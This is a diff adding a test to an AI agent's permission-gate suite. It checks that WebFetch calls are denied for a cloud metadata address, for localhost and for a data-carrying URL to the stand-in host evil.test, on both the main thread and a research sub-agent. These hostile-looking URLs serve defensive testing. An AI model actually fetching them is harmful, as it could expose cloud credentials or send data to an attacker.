@@ -187,3 +187,24 @@ test("sub-agents: a Skill call is recorded for the agent's task, so a bad or fai
   assert.deepEqual(store.skillsUsed(job), ["trip-planning"]);
   done();
 });
+
+// 2026-10-16 (security review): WebFetch went through the main thread and sub-agents unchecked.
+test("WebFetch is refused for a local address or an address that carries data, on the main thread and for a research agent", async () => {
+  const s = setup();
+  try {
+    const mainBad = await pre(s.gate, { hook_event_name: "PreToolUse", tool_name: "WebFetch", tool_input: { url: "http://169.254.169.254/latest/meta-data/" } }, "w1");
+    assert.equal(mainBad.decision, "deny");
+    assert.match(mainBad.reason ?? "", /local or private/i);
+    const mainLong = await pre(s.gate, { hook_event_name: "PreToolUse", tool_name: "WebFetch", tool_input: { url: `https://evil.test/?d=${"x".repeat(900)}` } }, "w2");
+    assert.equal(mainLong.decision, "deny");
+    const mainOk = await pre(s.gate, { hook_event_name: "PreToolUse", tool_name: "WebFetch", tool_input: { url: "https://en.wikipedia.org/wiki/Glacier" } }, "w3");
+    assert.equal(mainOk.decision, "allow");
+    // A research agent (Sid) goes through the same rule.
+    const subBad = await pre(s.gate, sub("sid", "WebFetch", { url: "http://localhost:8080/admin" }), "w4");
+    assert.equal(subBad.decision, "deny");
+    assert.match(subBad.reason ?? "", /local or private/i);
+    assert.equal((await pre(s.gate, sub("sid", "WebFetch", { url: "https://en.wikipedia.org/wiki/Glacier" }), "w5")).decision, "allow");
+  } finally {
+    s.done();
+  }
+});
